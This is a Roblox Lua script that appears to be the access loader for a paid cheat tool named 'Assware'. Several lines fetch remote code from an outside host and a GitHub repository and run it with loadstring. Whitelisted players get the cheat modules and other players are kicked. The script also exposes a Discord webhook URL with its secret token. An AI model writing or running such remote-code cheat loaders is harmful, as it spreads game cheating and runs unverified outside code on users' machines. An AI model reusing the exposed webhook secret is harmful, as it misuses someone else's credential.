local username = game.Players.LocalPlayer.Name
local down = loadstring(game:HttpGet("http://testproj11234.ct8.pl/waredown.txt"))()
if players[username] == true then
	print("loading assware for " .. username)
	local url = "Removed for security"
	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/gdmsg.lua"))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/v3.lua"))()
else
	game.Players.LocalPlayer:Kick("You dont have access to Assware, please open a ticket in the server if you bought the gamepass and need access")
	local url = "https://discord.com/api/webhooks/1162210538852450334/z0yFuSUNlm8vvVzsJQWvVOhGX1e58HU9HT841I-_VZg0EG_3ke5ggoOiyr1iov5DOZZ0"
	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/bdmsg.lua"))()
end

if down == true then
	game.Players.LocalPlayer:Kick("Assware is currently offline, please wait before using it again.")
end
